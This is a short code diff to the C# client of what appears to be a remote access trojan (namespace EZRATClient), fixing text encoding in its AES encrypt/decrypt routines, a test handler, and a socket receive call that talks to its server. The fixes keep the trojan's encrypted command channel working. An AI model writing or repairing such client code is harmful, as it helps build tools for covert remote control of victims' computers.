@@ -100,7 +100,7 @@ namespace EZRATClient
             try
             {
                 string EncryptionKey = EncryptKey; //Encryption key
-                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText); //Bytes of the message
+                byte[] clearBytes = Encoding.Default.GetBytes(clearText); //Bytes of the message
                 using (Aes encryptor = Aes.Create()) //Create a new AES decryptor
                 {
                     //Encrypt the data
@@ -150,7 +150,7 @@ namespace EZRATClient
                             cs.Write(cipherBytes, 0, cipherBytes.Length);
                             cs.Close();
                         }
-                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
+                        cipherText = Encoding.Default.GetString(ms.ToArray());
                     }
                 }
                 return cipherText; //Return the plain text data
@@ -187,7 +187,7 @@ namespace EZRATClient
         {
             if (text == "test")// i added this to start task manager
             {
-                SendCommand("Test");
+                Console.WriteLine("TEST");
             }
         }
 
@@ -223,7 +223,7 @@ namespace EZRATClient
             try
             {
                 int received = 0;
-                _clientSocket.Receive(buffer, SocketFlags.None); //Receive data from the server
+                received = _clientSocket.Receive(buffer, SocketFlags.None); //Receive data from the server
                 if (received == 0) return; //If failed to received data return
                 byte[] data = new byte[received]; //Create a new buffer with the exact data size
                 Array.Copy(buffer, data, received); //Copy from the receive to the exact size buffer
